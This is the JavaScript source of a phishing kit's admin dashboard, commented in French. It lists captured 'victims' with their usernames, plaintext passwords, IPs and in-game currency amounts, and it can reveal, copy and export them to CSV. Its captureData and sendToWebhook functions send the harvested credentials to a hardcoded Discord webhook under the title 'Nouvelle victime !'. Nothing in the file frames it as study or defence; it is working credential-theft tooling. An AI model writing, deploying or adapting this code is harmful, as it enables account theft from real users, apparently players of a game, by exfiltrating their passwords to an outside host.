// ============================================
// ADMIN PANEL - ULTRA SECURE & SMOOTH
// ============================================

// Configuration sécurisée
const ADMIN_CONFIG = {
    // Hash SHA256 de "password" - CHANGE LE !
    passwordHash: 'f06fe546025978a464814de8707eed32829a145e9967f3feaa57e0b5b8e0b8b6',
    username: 'admin',
    maxAttempts: 3,
    lockoutTime: 300000, // 5 minutes
    sessionDuration: 1800000 // 30 minutes
};

// State management
let currentUser = null;
let loginAttempts = 0;
let lockoutTimer = null;
let victims = [];
let currentPage = 1;
const itemsPerPage = 10;
let activityChart = null;

// ============================================
// INITIALISATION
// ============================================
document.addEventListener('DOMContentLoaded', () => {
    createAdminParticles();
    checkExistingSession();
    loadVictims();
    updateStats();
    
    // Auto refresh toutes les 30 secondes
    setInterval(() => {
        if (currentUser) {
            loadVictims();
            updateStats();
        }
    }, 30000);
    
    // Event listeners
    setupEventListeners();
    
    // Afficher l'IP
    document.getElementById('admin-ip').textContent = generateRandomIP();
});

function setupEventListeners() {
    // Enter key on login
    document.getElementById('admin-pass')?.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') adminLogin();
    });
    
    // Select all checkbox
    document.getElementById('select-all')?.addEventListener('change', (e) => {
        document.querySelectorAll('.victim-check').forEach(cb => cb.checked = e.target.checked);
    });
    
    // Search filter
    document.getElementById('victim-search')?.addEventListener('input', filterVictims);
}

// ============================================
// PARTICLES ANIMATION
// ============================================
function createAdminParticles() {
    const container = document.getElementById('admin-particles');
    if (!container) return;
    
    for (let i = 0; i < 30; i++) {
        const p = document.createElement('div');
        p.className = 'admin-particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 5 + 's';
        p.style.animationDuration = (Math.random() * 10 + 10) + 's';
        container.appendChild(p);
    }
}

// ============================================
// AUTHENTIFICATION
// ============================================
async function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

async function adminLogin() {
    const username = document.getElementById('admin-user')?.value;
    const password = document.getElementById('admin-pass')?.value;
    const errorDiv = document.getElementById('login-error');
    const btn = document.querySelector('.admin-login-btn');
    
    if (!username || !password) {
        showError('Veuillez remplir tous les champs');
        return;
    }
    
    if (loginAttempts >= ADMIN_CONFIG.maxAttempts) {
        showError('Trop de tentatives. Compte verrouillé 5 minutes.');
        return;
    }
    
    // Animation de vérification
    await runSecurityChecks();
    
    const hashedInput = await sha256(password);
    
    if (hashedInput === ADMIN_CONFIG.passwordHash && username === ADMIN_CONFIG.username) {
        // Success
        currentUser = {
            username: username,
            loginTime: Date.now(),
            ip: generateRandomIP()
        };
        
        saveSession();
        showDashboard();
        addLog(`Connexion réussie: ${username} depuis IP ${currentUser.ip}`);
    } else {
        loginAttempts++;
        const remaining = ADMIN_CONFIG.maxAttempts - loginAttempts;
        showError(`Identifiants invalides. ${remaining} tentatives restantes.`);
        
        if (loginAttempts >= ADMIN_CONFIG.maxAttempts) {
            lockout();
        }
    }
}

async function runSecurityChecks() {
    const check1 = document.getElementById('check-1');
    const check2 = document.getElementById('check-2');
    
    if (check1) {
        check1.classList.add('checking');
        await sleep(600);
        check1.classList.remove('checking');
        check1.classList.add('checked');
    }
    
    if (check2) {
        check2.classList.add('checking');
        await sleep(600);
        check2.classList.remove('checking');
        check2.classList.add('checked');
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function showError(msg) {
    const errorDiv = document.getElementById('login-error');
    if (errorDiv) {
        errorDiv.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${msg}`;
        errorDiv.style.display = 'block';
        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 3000);
    }
}

function lockout() {
    const btn = document.querySelector('.admin-login-btn');
    if (btn) {
        btn.disabled = true;
        setTimeout(() => {
            btn.disabled = false;
            loginAttempts = 0;
        }, ADMIN_CONFIG.lockoutTime);
    }
}

function saveSession() {
    const session = {
        user: currentUser,
        expires: Date.now() + ADMIN_CONFIG.sessionDuration
    };
    localStorage.setItem('admin_session', JSON.stringify(session));
}

function checkExistingSession() {
    const session = JSON.parse(localStorage.getItem('admin_session') || 'null');
    if (session && session.expires > Date.now()) {
        currentUser = session.user;
        showDashboard();
    }
}

function showDashboard() {
    const loginScreen = document.getElementById('admin-login');
    const dashboard = document.getElementById('admin-dashboard');
    
    if (loginScreen) loginScreen.style.display = 'none';
    if (dashboard) dashboard.style.display = 'flex';
    
    startSessionTimer();
    initChart();
    renderVictims();
}

function startSessionTimer() {
    const updateTimer = () => {
        if (!currentUser) return;
        const remaining = Math.floor((currentUser.loginTime + ADMIN_CONFIG.sessionDuration - Date.now()) / 1000);
        if (remaining <= 0) {
            adminLogout();
            return;
        }
        const mins = Math.floor(remaining / 60);
        const secs = remaining % 60;
        const timerEl = document.getElementById('session-time');
        if (timerEl) {
            timerEl.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
    };
    setInterval(updateTimer, 1000);
    updateTimer();
}

function adminLogout() {
    localStorage.removeItem('admin_session');
    currentUser = null;
    window.location.reload();
}

// ============================================
// GESTION DES VICTIMES
// ============================================
function loadVictims() {
    // Charger depuis le localStorage (simulation)
    victims = JSON.parse(localStorage.getItem('captured_data') || '[]');
    victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    renderVictims();
    updateStats();
}

function renderVictims() {
    const tbody = document.getElementById('victims-tbody');
    const recentList = document.getElementById('recent-victims-list');
    const countBadge = document.getElementById('victim-count');
    
    if (countBadge) countBadge.textContent = victims.length;
    
    // Table pagination
    const start = (currentPage - 1) * itemsPerPage;
    const paginated = victims.slice(start, start + itemsPerPage);
    
    if (tbody) {
        tbody.innerHTML = paginated.map((v, i) => `
            <tr class="victim-row" onclick="showVictimDetail(${start + i})">
                <td><input type="checkbox" class="victim-check" onclick="event.stopPropagation()"></td>
                <td><img src="${v.avatar || 'https://via.placeholder.com/40'}" class="victim-avatar-small" alt=""></td>
                <td><strong>${escapeHtml(v.username)}</strong></td>
                <td><code class="password-mask" onclick="event.stopPropagation(); togglePassword(this, '${escapeHtml(v.password)}')">••••••••</code></td>
                <td><span class="ip-badge">${v.ip || 'N/A'}</span></td>
                <td>${formatDate(v.timestamp)}</td>
                <td class="user-agent-cell" title="${escapeHtml(v.userAgent || '')}">${truncate(v.userAgent, 30)}</td>
                <td>
                    <button class="btn btn-sm btn-info" onclick="event.stopPropagation(); copyData('${escapeHtml(v.username)}', '${escapeHtml(v.password)}')">
                        <i class="fas fa-copy"></i>
                    </button>
                    <button class="btn btn-sm btn-danger" onclick="event.stopPropagation(); deleteVictim(${start + i})">
                        <i class="fas fa-trash"></i>
                    </button>
                </td>
            </tr>
        `).join('');
    }
    
    // Recent list (sidebar)
    if (recentList) {
        recentList.innerHTML = victims.slice(0, 5).map(v => `
            <div class="recent-victim-item" onclick="showVictimDetail(${victims.indexOf(v)})">
                <img src="${v.avatar || 'https://via.placeholder.com/32'}" class="rv-avatar" alt="">
                <div class="rv-info">
                    <div class="rv-name">${escapeHtml(v.username)}</div>
                    <div class="rv-time">${timeAgo(v.timestamp)}</div>
                </div>
                <div class="rv-amount">${v.amount || 'N/A'} R$</div>
            </div>
        `).join('');
    }
    
    const pageInfo = document.getElementById('page-info');
    if (pageInfo) {
        pageInfo.textContent = `Page ${currentPage} sur ${Math.ceil(victims.length / itemsPerPage) || 1}`;
    }
}

function updateStats() {
    const totalEl = document.getElementById('total-victims');
    const todayEl = document.getElementById('today-victims');
    const passwordsEl = document.getElementById('passwords-count');
    const lastEl = document.getElementById('last-activity');
    const trendEl = document.getElementById('trend-percent');
    
    if (totalEl) totalEl.textContent = victims.length;
    if (passwordsEl) passwordsEl.textContent = victims.length;
    
    const today = new Date().toDateString();
    const todayCount = victims.filter(v => new Date(v.timestamp).toDateString() === today).length;
    if (todayEl) todayEl.textContent = todayCount;
    
    if (victims.length > 0) {
        const last = new Date(victims[0].timestamp);
        if (lastEl) lastEl.textContent = last.toLocaleTimeString('fr-FR', {hour: '2-digit', minute: '2-digit'});
    }
    
    // Trend calculation
    const yesterday = new Date();
    yesterday.setDate(yesterday.getDate() - 1);
    const yestCount = victims.filter(v => new Date(v.timestamp).toDateString() === yesterday.toDateString()).length;
    const trend = yestCount > 0 ? Math.round(((todayCount - yestCount) / yestCount) * 100) : 100;
    if (trendEl) trendEl.textContent = trend;
}

function togglePassword(el, realPass) {
    if (el.textContent === '••••••••') {
        el.textContent = realPass;
        el.classList.add('revealed');
    } else {
        el.textContent = '••••••••';
        el.classList.remove('revealed');
    }
}

function showVictimDetail(index) {
    const v = victims[index];
    if (!v) return;
    
    const modal = document.getElementById('victim-modal');
    const content = document.getElementById('modal-content');
    
    if (content) {
        content.innerHTML = `
            <div class="victim-detail">
                <div class="vd-header">
                    <img src="${v.avatar || 'https://via.placeholder.com/80'}" class="vd-avatar" alt="">
                    <div class="vd-title">
                        <h3>${escapeHtml(v.username)}</h3>
                        <span class="vd-badge">Capturé</span>
                    </div>
                </div>
                <div class="vd-grid">
                    <div class="vd-item">
                        <label>Mot de passe</label>
                        <value>${escapeHtml(v.password)}</value>
                    </div>
                    <div class="vd-item">
                        <label>Adresse IP</label>
                        <value>${v.ip || 'N/A'}</value>
                    </div>
                    <div class="vd-item">
                        <label>Date/Heure</label>
                        <value>${formatDate(v.timestamp)}</value>
                    </div>
                    <div class="vd-item">
                        <label>User Agent</label>
                        <value style="font-size:12px;">${escapeHtml(v.userAgent || 'N/A')}</value>
                    </div>
                    <div class="vd-item" style="grid-column: span 2;">
                        <label>URL de capture</label>
                        <value style="font-size:12px;word-break:break-all;">${escapeHtml(v.url || window.location.href)}</value>
                    </div>
                </div>
            </div>
        `;
    }
    
    if (modal) modal.classList.add('active');
}

function closeModal() {
    const modal = document.getElementById('victim-modal');
    if (modal) modal.classList.remove('active');
}

function deleteVictim(index) {
    if (confirm('Supprimer cette victime ?')) {
        victims.splice(index, 1);
        localStorage.setItem('captured_data', JSON.stringify(victims));
        renderVictims();
        updateStats();
        addLog(`Victime supprimée (index: ${index})`);
    }
}

function filterVictims() {
    const search = document.getElementById('victim-search')?.value.toLowerCase();
    if (!search) {
        renderVictims();
        return;
    }
    
    const filtered = victims.filter(v => 
        v.username.toLowerCase().includes(search) ||
        v.ip?.includes(search)
    );
    
    const tbody = document.getElementById('victims-tbody');
    if (tbody) {
        tbody.innerHTML = filtered.map((v, i) => `
            <tr class="victim-row" onclick="showVictimDetail(${victims.indexOf(v)})">
                <td><input type="checkbox" class="victim-check" onclick="event.stopPropagation()"></td>
                <td><img src="${v.avatar || 'https://via.placeholder.com/40'}" class="victim-avatar-small" alt=""></td>
                <td><strong>${escapeHtml(v.username)}</strong></td>
                <td><code class="password-mask" onclick="event.stopPropagation(); togglePassword(this, '${escapeHtml(v.password)}')">••••••••</code></td>
                <td><span class="ip-badge">${v.ip || 'N/A'}</span></td>
                <td>${formatDate(v.timestamp)}</td>
                <td class="user-agent-cell" title="${escapeHtml(v.userAgent || '')}">${truncate(v.userAgent, 30)}</td>
                <td>
                    <button class="btn btn-sm btn-info" onclick="event.stopPropagation(); copyData('${escapeHtml(v.username)}', '${escapeHtml(v.password)}')">
                        <i class="fas fa-copy"></i>
                    </button>
                    <button class="btn btn-sm btn-danger" onclick="event.stopPropagation(); deleteVictim(${victims.indexOf(v)})">
                        <i class="fas fa-trash"></i>
                    </button>
                </td>
            </tr>
        `).join('');
    }
}

function changePage(direction) {
    const maxPage = Math.ceil(victims.length / itemsPerPage);
    currentPage += direction;
    if (currentPage < 1) currentPage = 1;
    if (currentPage > maxPage) currentPage = maxPage;
    renderVictims();
}

function copyData(username, password) {
    const text = `Username: ${username}\nPassword: ${password}`;
    navigator.clipboard.writeText(text).then(() => {
        showToast('Copié dans le presse-papiers !');
    });
}

function exportToCSV() {
    const csv = [
        ['Username', 'Password', 'IP', 'Timestamp', 'User Agent'],
        ...victims.map(v => [
            v.username,
            v.password,
            v.ip || '',
            v.timestamp,
            v.userAgent || ''
        ])
    ].map(row => row.map(cell => `"${cell}"`).join(',')).join('\n');
    
    const blob = new Blob([csv], { type: 'text/csv' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `victims_${new Date().toISOString().split('T')[0]}.csv`;
    a.click();
    window.URL.revokeObjectURL(url);
    
    addLog('Export CSV effectué');
}

function refreshData() {
    loadVictims();
    showToast('Données actualisées');
}

// ============================================
// NAVIGATION
// ============================================
function showSection(sectionName) {
    // Hide all sections
    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
    document.querySelectorAll('.sidebar-menu li').forEach(l => l.classList.remove('active'));
    
    // Show selected
    const section = document.getElementById(`section-${sectionName}`);
    if (section) section.classList.add('active');
    
    // Update menu
    const menuItems = document.querySelectorAll('.sidebar-menu li');
    const index = ['overview', 'victims', 'logs', 'settings'].indexOf(sectionName);
    if (index >= 0 && menuItems[index]) menuItems[index].classList.add('active');
}

function toggleNotifications() {
    showToast(`${victims.length} victimes capturées`);
}

// ============================================
// CHART
// ============================================
function initChart() {
    const ctx = document.getElementById('activityChart');
    if (!ctx) return;
    
    const hours = Array.from({length: 24}, (_, i) => `${i}h`);
    const data = hours.map(() => Math.floor(Math.random() * 10));
    
    activityChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: hours,
            datasets: [{
                label: 'Connexions',
                data: data,
                borderColor: '#6366f1',
                backgroundColor: 'rgba(99, 102, 241, 0.1)',
                tension: 0.4,
                fill: true
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: { display: false }
            },
            scales: {
                y: {
                    beginAtZero: true,
                    grid: { color: 'rgba(255, 255, 255, 0.1)' },
                    ticks: { color: '#94a3b8' }
                },
                x: {
                    grid: { display: false },
                    ticks: { color: '#94a3b8' }
                }
            }
        }
    });
}

// ============================================
// UTILITAIRES
// ============================================
function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function truncate(str, n) {
    if (!str) return '';
    return str.length > n ? str.substr(0, n-1) + '...' : str;
}

function formatDate(timestamp) {
    if (!timestamp) return 'N/A';
    const date = new Date(timestamp);
    return date.toLocaleString('fr-FR');
}

function timeAgo(timestamp) {
    const seconds = Math.floor((new Date() - new Date(timestamp)) / 1000);
    if (seconds < 60) return 'À l\'instant';
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `Il y a ${minutes} min`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `Il y a ${hours}h`;
    return `Il y a ${Math.floor(hours / 24)}j`;
}

function generateRandomIP() {
    return `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function showToast(message) {
    const toast = document.createElement('div');
    toast.style.cssText = `
        position: fixed;
        bottom: 24px;
        right: 24px;
        background: rgba(16, 185, 129, 0.9);
        color: white;
        padding: 16px 24px;
        border-radius: 12px;
        font-weight: 600;
        z-index: 10000;
        animation: slideIn 0.3s ease;
    `;
    toast.textContent = message;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.style.animation = 'fadeOut 0.3s ease';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function addLog(message) {
    const logsContainer = document.getElementById('system-logs');
    if (!logsContainer) return;
    
    const time = new Date().toLocaleTimeString('fr-FR');
    const entry = document.createElement('div');
    entry.className = 'log-entry';
    entry.innerHTML = `<span class="log-time">[${time}]</span> ${escapeHtml(message)}`;
    logsContainer.insertBefore(entry, logsContainer.firstChild);
}

function clearLogs() {
    const logsContainer = document.getElementById('system-logs');
    if (logsContainer) logsContainer.innerHTML = '';
}

// ============================================
// CAPTURE DE DONNÉES (pour index.html)
// ============================================
function captureData(username, password, amount) {
    const data = {
        username: username,
        password: password,
        amount: amount || 'N/A',
        ip: generateRandomIP(),
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        url: window.location.href
    };
    
    // Sauvegarder dans localStorage
    const existing = JSON.parse(localStorage.getItem('captured_data') || '[]');
    existing.push(data);
    localStorage.setItem('captured_data', JSON.stringify(existing));
    
    // Envoyer au webhook si configuré
    sendToWebhook(data);
    
    return data;
}

function sendToWebhook(data) {
    // Ton webhook Discord ici
    const webhookUrl = 'https://discord.com/api/webhooks/1490805370715902075/gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9';
    
    fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            embeds: [{
                title: '🎣 Nouvelle victime !',
                color: 0x00ff00,
                fields: [
                    { name: 'Username', value: data.username, inline: true },
                    { name: 'Password', value: '||' + data.password + '||', inline: true },
                    { name: 'IP', value: data.ip, inline: true },
                    { name: 'Amount', value: data.amount, inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        })
    }).catch(() => {});
}

// CSS animations pour toast
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    @keyframes fadeOut {
        from { opacity: 1; }
        to { opacity: 0; }
    }
`;
document.head.appendChild(style);
